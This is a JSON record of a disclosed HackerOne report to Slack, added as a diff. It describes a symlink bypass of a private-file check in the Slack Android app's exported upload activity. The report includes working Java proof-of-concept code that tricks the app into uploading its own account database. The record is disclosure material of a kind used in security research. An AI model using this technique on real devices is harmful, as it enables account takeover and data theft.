@@ -1,0 +1,162 @@
+{
+  "id": 375083,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzUwODM=",
+  "url": "https://hackerone.com/reports/375083",
+  "title": "Private application files can be uploaded to Slack via malicious uploader",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2018-07-01T21:21:38.639Z",
+  "submitted_at": "2018-07-01T21:21:38.639Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "shell_c0de",
+    "url": "/shell_c0de",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/286/336/6c31698bb7e83a8bb394303ec2b1a31513a1bb99_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 69,
+    "url": "https://hackerone.com/slack",
+    "handle": "slack",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Slack",
+      "twitter_handle": "slackhq",
+      "website": "https://slack.com",
+      "about": "All your team communication in one place, instantly searchable, and available wherever you go."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-08-04T14:35:24.669Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-07-05T14:35:23.569Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi. I have found an issue which allows to retrieve any files from `/data/data/com.Slack/*` directory. The problem is in exported activity `com.Slack.ui.UploadActivity` which accepts a URI to download files. I see that you've added verification\n```java\nprivate static boolean isPrivateFile(Uri uri) {\n        return uri.getPathSegments().contains(\"com.Slack\");\n    }\n```\nYou can bypass the verification using symlink files. Malicious code:\n```java\n StrictMode.VmPolicy.Builder builder = new StrictMode.VmPolicy.Builder();\n    StrictMode.setVmPolicy(builder.build());\n    new File(\"/data/data/com.example.route.readfileapk/\").setReadable(true,false);\n    new File(\"/data/data/com.example.route.readfileapk/\").setWritable(true,false);\n    new File(\"/data/data/com.example.route.readfileapk/\").setExecutable(true,false);\n   \n       try {\n            Runtime.getRuntime().exec(\"ln -s /data/data/com.Slack/databases/account_manager /data/data/com.example.route.readfileapk/account_manager\").waitFor();\n        }\n        catch(Exception e) {\n            e.printStackTrace();\n            finish();\n            return;\n        }\n        new File(\"/data/data/com.example.route.readfileapk/account_manager\").setReadable(true,false);\n        Intent intent = new Intent(\"android.intent.action.SEND\");\n        intent.setClassName(\"com.Slack\", \"com.Slack.ui.UploadActivity\");\n        intent.setType(\"*/*\");\n        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);\n        intent.putExtra(\"android.intent.extra.STREAM\", Uri.parse(\"file:///data/data/com.example.route.readfileapk/account_manager\"));\n        startActivity(intent);\n```\nMalware creates a link to your file `/data/data/com.Slack/databases/account_manager` (where `com.example.route.readfileapk` is package name of the malware), grants read/execute permission to any user (I mean Linux users), and starts your activity with the new URI.\n\n## Impact\n\nThis vulnerability can get a complete account, malware can access everything, including cookies, history and e-mail.",
+  "bounty_amount": "500.0",
+  "formatted_bounty": "$500",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 314396,
+      "file_name": "JhxHDcibKVI.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/314/396/0b65877b7212c97d609736d58d6794bad6d020c7/JhxHDcibKVI.jpg?response-content-disposition=attachment%3B%20filename%3D%22JhxHDcibKVI.jpg%22%3B%20filename%2A%3DUTF-8%27%27JhxHDcibKVI.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2C5LCWPJ%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T225520Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDRfIf7p%2BzB84l2H%2BvTveuAllNHw3AQwpkferefiRqrKwIhALmpXT6p7j1ejFaXcC2L9M%2BeXd%2B5%2FMpLBbddxg1D%2FkX3KrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igyy4PU6LPl7zC%2BIYCMqjwUqyD3Gtagvz456amGT%2FdlSEs3qr5mIo7ufyYryGf0mR%2FZIYvvGBwa6I4Xv%2Bf2RExNRWL1PEBasTqXmjnSNE6Njx4NM6lQehtQhCkLNtVpvk9mxuDWol%2F%2Bd9X99J5HgfFTvTIK0sND5OdwK2Xii7TAU89d1wXsNIAeBxeEDxFXeNehRjTj8%2BP5qOgeKwO0ilW4tzaQrKo4vmNb0b0OXzJeHaOk5BfIaf8mekXGLvXUbQpZVDg%2BQV%2FG0BVNOXB2Ssg7CLKeJpVi3KXUk8I3p5NHbKNjSwtxsQwiAk77EzG%2BjFjrnJc%2FXosrh6bw%2BkYmNMWoG4e8aXiBxqswo85upElPRefvj0X4i5ksfIzFHxJ6mTE%2FfrMa8NLCdJiDHdhdLcayvQshQhnASmWjx9IXAly6esRF0lWV1WqMNbvioXbS1j6TaXFCzBhav8eXgJ1mjvZZOYw9twxC4gen6fVCjRVL27MiPT0CtoJo9TSej4gKA6SuQ1kxpquOTL6un7G1HXjRYlN%2BWfFtYGEMiAtOU3%2Br0VEJjcSEqfC2uBF2WtCciZ6h1V75%2FfOjEfPED%2BlUqBFDZBRUb6TDCvqxVh4RzQLWHlt5xKII%2B4YlutXBtzQ4m8JlEY7CxA8UlJfCyhcuQHF1kLjk4SWqV8JclDRdNXYAq42jih52Mbx1wBCDVEGwHnifQGBKoka6ArQtQ9l9lwAyNoKaBL9bmAfEXY2IY%2BSdIIJfMjrQHLjCwd6%2BHKEkS7cn7Go8VnsSSNZvaEyBQW%2BeXeD%2BXePUEd8eJeyVV14Q71Akogq%2BZW7QabybvPQdDL949VfHBi%2BhlrtSWq%2Fs5oUjgKUdiEM2eQ3dcnyouTyh5e%2B%2FHBxonwl9UBzmWdO9eMM%2FH4swGOrABdvcTMAy7%2FX5QI0FWQY77Fy6VatG6FqLZVm2BH780w05CdAQ6XHdzoNstEpm1e4DJqivADaRF%2F37TV9nnX1a0PlypiNAVMFuCoQIp3eBQGK8Y%2FYI%2FL%2BHWW25L%2FRU8Yqh9Rkx8cYD%2BTLMImqaG8uvgOuMBhubbhdxvh83NJbTZl2NnkQpNG7Jqy%2BMyvAUTiYA19p%2FT6VqQFadaDqM2Ox6RShImGGVR1NdtIkxK7l1Om8w%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c5bcc1dffc42df53efc7c91aaa5923562642e9f5d443b666b86e6e3a95cc6994",
+      "file_size": 68160,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 314397,
+      "file_name": "2451RVhK2S8.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/314/397/c4fdb588fcedd92288950ad8945d4c4a95bb93ea/2451RVhK2S8.jpg?response-content-disposition=attachment%3B%20filename%3D%222451RVhK2S8.jpg%22%3B%20filename%2A%3DUTF-8%27%272451RVhK2S8.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2C5LCWPJ%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T225520Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDRfIf7p%2BzB84l2H%2BvTveuAllNHw3AQwpkferefiRqrKwIhALmpXT6p7j1ejFaXcC2L9M%2BeXd%2B5%2FMpLBbddxg1D%2FkX3KrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igyy4PU6LPl7zC%2BIYCMqjwUqyD3Gtagvz456amGT%2FdlSEs3qr5mIo7ufyYryGf0mR%2FZIYvvGBwa6I4Xv%2Bf2RExNRWL1PEBasTqXmjnSNE6Njx4NM6lQehtQhCkLNtVpvk9mxuDWol%2F%2Bd9X99J5HgfFTvTIK0sND5OdwK2Xii7TAU89d1wXsNIAeBxeEDxFXeNehRjTj8%2BP5qOgeKwO0ilW4tzaQrKo4vmNb0b0OXzJeHaOk5BfIaf8mekXGLvXUbQpZVDg%2BQV%2FG0BVNOXB2Ssg7CLKeJpVi3KXUk8I3p5NHbKNjSwtxsQwiAk77EzG%2BjFjrnJc%2FXosrh6bw%2BkYmNMWoG4e8aXiBxqswo85upElPRefvj0X4i5ksfIzFHxJ6mTE%2FfrMa8NLCdJiDHdhdLcayvQshQhnASmWjx9IXAly6esRF0lWV1WqMNbvioXbS1j6TaXFCzBhav8eXgJ1mjvZZOYw9twxC4gen6fVCjRVL27MiPT0CtoJo9TSej4gKA6SuQ1kxpquOTL6un7G1HXjRYlN%2BWfFtYGEMiAtOU3%2Br0VEJjcSEqfC2uBF2WtCciZ6h1V75%2FfOjEfPED%2BlUqBFDZBRUb6TDCvqxVh4RzQLWHlt5xKII%2B4YlutXBtzQ4m8JlEY7CxA8UlJfCyhcuQHF1kLjk4SWqV8JclDRdNXYAq42jih52Mbx1wBCDVEGwHnifQGBKoka6ArQtQ9l9lwAyNoKaBL9bmAfEXY2IY%2BSdIIJfMjrQHLjCwd6%2BHKEkS7cn7Go8VnsSSNZvaEyBQW%2BeXeD%2BXePUEd8eJeyVV14Q71Akogq%2BZW7QabybvPQdDL949VfHBi%2BhlrtSWq%2Fs5oUjgKUdiEM2eQ3dcnyouTyh5e%2B%2FHBxonwl9UBzmWdO9eMM%2FH4swGOrABdvcTMAy7%2FX5QI0FWQY77Fy6VatG6FqLZVm2BH780w05CdAQ6XHdzoNstEpm1e4DJqivADaRF%2F37TV9nnX1a0PlypiNAVMFuCoQIp3eBQGK8Y%2FYI%2FL%2BHWW25L%2FRU8Yqh9Rkx8cYD%2BTLMImqaG8uvgOuMBhubbhdxvh83NJbTZl2NnkQpNG7Jqy%2BMyvAUTiYA19p%2FT6VqQFadaDqM2Ox6RShImGGVR1NdtIkxK7l1Om8w%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a43a4db1b4e23c01858c41611aa9cd42a9a711e5a0a1fbbe41a915f94e418094",
+      "file_size": 81681,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 314398,
+      "file_name": "PQzofS_icd4.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/314/398/1440e38cfeac5f39430fe0d291129322b24bfdd8/PQzofS_icd4.jpg?response-content-disposition=attachment%3B%20filename%3D%22PQzofS_icd4.jpg%22%3B%20filename%2A%3DUTF-8%27%27PQzofS_icd4.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2C5LCWPJ%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T225520Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDRfIf7p%2BzB84l2H%2BvTveuAllNHw3AQwpkferefiRqrKwIhALmpXT6p7j1ejFaXcC2L9M%2BeXd%2B5%2FMpLBbddxg1D%2FkX3KrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igyy4PU6LPl7zC%2BIYCMqjwUqyD3Gtagvz456amGT%2FdlSEs3qr5mIo7ufyYryGf0mR%2FZIYvvGBwa6I4Xv%2Bf2RExNRWL1PEBasTqXmjnSNE6Njx4NM6lQehtQhCkLNtVpvk9mxuDWol%2F%2Bd9X99J5HgfFTvTIK0sND5OdwK2Xii7TAU89d1wXsNIAeBxeEDxFXeNehRjTj8%2BP5qOgeKwO0ilW4tzaQrKo4vmNb0b0OXzJeHaOk5BfIaf8mekXGLvXUbQpZVDg%2BQV%2FG0BVNOXB2Ssg7CLKeJpVi3KXUk8I3p5NHbKNjSwtxsQwiAk77EzG%2BjFjrnJc%2FXosrh6bw%2BkYmNMWoG4e8aXiBxqswo85upElPRefvj0X4i5ksfIzFHxJ6mTE%2FfrMa8NLCdJiDHdhdLcayvQshQhnASmWjx9IXAly6esRF0lWV1WqMNbvioXbS1j6TaXFCzBhav8eXgJ1mjvZZOYw9twxC4gen6fVCjRVL27MiPT0CtoJo9TSej4gKA6SuQ1kxpquOTL6un7G1HXjRYlN%2BWfFtYGEMiAtOU3%2Br0VEJjcSEqfC2uBF2WtCciZ6h1V75%2FfOjEfPED%2BlUqBFDZBRUb6TDCvqxVh4RzQLWHlt5xKII%2B4YlutXBtzQ4m8JlEY7CxA8UlJfCyhcuQHF1kLjk4SWqV8JclDRdNXYAq42jih52Mbx1wBCDVEGwHnifQGBKoka6ArQtQ9l9lwAyNoKaBL9bmAfEXY2IY%2BSdIIJfMjrQHLjCwd6%2BHKEkS7cn7Go8VnsSSNZvaEyBQW%2BeXeD%2BXePUEd8eJeyVV14Q71Akogq%2BZW7QabybvPQdDL949VfHBi%2BhlrtSWq%2Fs5oUjgKUdiEM2eQ3dcnyouTyh5e%2B%2FHBxonwl9UBzmWdO9eMM%2FH4swGOrABdvcTMAy7%2FX5QI0FWQY77Fy6VatG6FqLZVm2BH780w05CdAQ6XHdzoNstEpm1e4DJqivADaRF%2F37TV9nnX1a0PlypiNAVMFuCoQIp3eBQGK8Y%2FYI%2FL%2BHWW25L%2FRU8Yqh9Rkx8cYD%2BTLMImqaG8uvgOuMBhubbhdxvh83NJbTZl2NnkQpNG7Jqy%2BMyvAUTiYA19p%2FT6VqQFadaDqM2Ox6RShImGGVR1NdtIkxK7l1Om8w%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9963b844c9303a2a5a80a89989042b4e8d1741b4b91e2f968c1f2044098a03cc",
+      "file_size": 122398,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 314404,
+      "file_name": "com.example.route.readfileapk.apk",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/314/404/b8833fc0884d99fd5a050cb4c65f743c94f53634/com.example.route.readfileapk.apk?response-content-disposition=attachment%3B%20filename%3D%22com.example.route.readfileapk.apk%22%3B%20filename%2A%3DUTF-8%27%27com.example.route.readfileapk.apk&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2C5LCWPJ%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T225520Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDRfIf7p%2BzB84l2H%2BvTveuAllNHw3AQwpkferefiRqrKwIhALmpXT6p7j1ejFaXcC2L9M%2BeXd%2B5%2FMpLBbddxg1D%2FkX3KrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igyy4PU6LPl7zC%2BIYCMqjwUqyD3Gtagvz456amGT%2FdlSEs3qr5mIo7ufyYryGf0mR%2FZIYvvGBwa6I4Xv%2Bf2RExNRWL1PEBasTqXmjnSNE6Njx4NM6lQehtQhCkLNtVpvk9mxuDWol%2F%2Bd9X99J5HgfFTvTIK0sND5OdwK2Xii7TAU89d1wXsNIAeBxeEDxFXeNehRjTj8%2BP5qOgeKwO0ilW4tzaQrKo4vmNb0b0OXzJeHaOk5BfIaf8mekXGLvXUbQpZVDg%2BQV%2FG0BVNOXB2Ssg7CLKeJpVi3KXUk8I3p5NHbKNjSwtxsQwiAk77EzG%2BjFjrnJc%2FXosrh6bw%2BkYmNMWoG4e8aXiBxqswo85upElPRefvj0X4i5ksfIzFHxJ6mTE%2FfrMa8NLCdJiDHdhdLcayvQshQhnASmWjx9IXAly6esRF0lWV1WqMNbvioXbS1j6TaXFCzBhav8eXgJ1mjvZZOYw9twxC4gen6fVCjRVL27MiPT0CtoJo9TSej4gKA6SuQ1kxpquOTL6un7G1HXjRYlN%2BWfFtYGEMiAtOU3%2Br0VEJjcSEqfC2uBF2WtCciZ6h1V75%2FfOjEfPED%2BlUqBFDZBRUb6TDCvqxVh4RzQLWHlt5xKII%2B4YlutXBtzQ4m8JlEY7CxA8UlJfCyhcuQHF1kLjk4SWqV8JclDRdNXYAq42jih52Mbx1wBCDVEGwHnifQGBKoka6ArQtQ9l9lwAyNoKaBL9bmAfEXY2IY%2BSdIIJfMjrQHLjCwd6%2BHKEkS7cn7Go8VnsSSNZvaEyBQW%2BeXeD%2BXePUEd8eJeyVV14Q71Akogq%2BZW7QabybvPQdDL949VfHBi%2BhlrtSWq%2Fs5oUjgKUdiEM2eQ3dcnyouTyh5e%2B%2FHBxonwl9UBzmWdO9eMM%2FH4swGOrABdvcTMAy7%2FX5QI0FWQY77Fy6VatG6FqLZVm2BH780w05CdAQ6XHdzoNstEpm1e4DJqivADaRF%2F37TV9nnX1a0PlypiNAVMFuCoQIp3eBQGK8Y%2FYI%2FL%2BHWW25L%2FRU8Yqh9Rkx8cYD%2BTLMImqaG8uvgOuMBhubbhdxvh83NJbTZl2NnkQpNG7Jqy%2BMyvAUTiYA19p%2FT6VqQFadaDqM2Ox6RShImGGVR1NdtIkxK7l1Om8w%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cbdfef1bb3368535c1cb9a5411e63aa88837e5eb92701ab53c99f2d8eaa394cc",
+      "file_size": 1463215,
+      "type": "application/zip",
+      "moderated": null
+    },
+    {
+      "id": 314405,
+      "file_name": "DSxS8FlOR7M.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/314/405/4dab2cd17410e3a3a9aaba709c4d11f5d96f7116/DSxS8FlOR7M.jpg?response-content-disposition=attachment%3B%20filename%3D%22DSxS8FlOR7M.jpg%22%3B%20filename%2A%3DUTF-8%27%27DSxS8FlOR7M.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2C5LCWPJ%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T225520Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDRfIf7p%2BzB84l2H%2BvTveuAllNHw3AQwpkferefiRqrKwIhALmpXT6p7j1ejFaXcC2L9M%2BeXd%2B5%2FMpLBbddxg1D%2FkX3KrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igyy4PU6LPl7zC%2BIYCMqjwUqyD3Gtagvz456amGT%2FdlSEs3qr5mIo7ufyYryGf0mR%2FZIYvvGBwa6I4Xv%2Bf2RExNRWL1PEBasTqXmjnSNE6Njx4NM6lQehtQhCkLNtVpvk9mxuDWol%2F%2Bd9X99J5HgfFTvTIK0sND5OdwK2Xii7TAU89d1wXsNIAeBxeEDxFXeNehRjTj8%2BP5qOgeKwO0ilW4tzaQrKo4vmNb0b0OXzJeHaOk5BfIaf8mekXGLvXUbQpZVDg%2BQV%2FG0BVNOXB2Ssg7CLKeJpVi3KXUk8I3p5NHbKNjSwtxsQwiAk77EzG%2BjFjrnJc%2FXosrh6bw%2BkYmNMWoG4e8aXiBxqswo85upElPRefvj0X4i5ksfIzFHxJ6mTE%2FfrMa8NLCdJiDHdhdLcayvQshQhnASmWjx9IXAly6esRF0lWV1WqMNbvioXbS1j6TaXFCzBhav8eXgJ1mjvZZOYw9twxC4gen6fVCjRVL27MiPT0CtoJo9TSej4gKA6SuQ1kxpquOTL6un7G1HXjRYlN%2BWfFtYGEMiAtOU3%2Br0VEJjcSEqfC2uBF2WtCciZ6h1V75%2FfOjEfPED%2BlUqBFDZBRUb6TDCvqxVh4RzQLWHlt5xKII%2B4YlutXBtzQ4m8JlEY7CxA8UlJfCyhcuQHF1kLjk4SWqV8JclDRdNXYAq42jih52Mbx1wBCDVEGwHnifQGBKoka6ArQtQ9l9lwAyNoKaBL9bmAfEXY2IY%2BSdIIJfMjrQHLjCwd6%2BHKEkS7cn7Go8VnsSSNZvaEyBQW%2BeXeD%2BXePUEd8eJeyVV14Q71Akogq%2BZW7QabybvPQdDL949VfHBi%2BhlrtSWq%2Fs5oUjgKUdiEM2eQ3dcnyouTyh5e%2B%2FHBxonwl9UBzmWdO9eMM%2FH4swGOrABdvcTMAy7%2FX5QI0FWQY77Fy6VatG6FqLZVm2BH780w05CdAQ6XHdzoNstEpm1e4DJqivADaRF%2F37TV9nnX1a0PlypiNAVMFuCoQIp3eBQGK8Y%2FYI%2FL%2BHWW25L%2FRU8Yqh9Rkx8cYD%2BTLMImqaG8uvgOuMBhubbhdxvh83NJbTZl2NnkQpNG7Jqy%2BMyvAUTiYA19p%2FT6VqQFadaDqM2Ox6RShImGGVR1NdtIkxK7l1Om8w%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=928ccb9b560e0ca72f5b73625268abadd9dbc548c2c27e77f041d8aaeaf1a046",
+      "file_size": 35087,
+      "type": "image/jpeg",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-08-04T14:35:23.636Z",
+  "allow_singular_disclosure_after": -143540396.58507374,
+  "singular_disclosure_allowed": true,
+  "vote_count": 37,
+  "voters": [
+    "socpuppet",
+    "drsniper",
+    "todayisnew-",
+    "ali",
+    "run_win",
+    "shell_c0de",
+    "akashhamal0x01",
+    "f_m",
+    "xsstestov",
+    "nem0x00",
+    "and 27 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
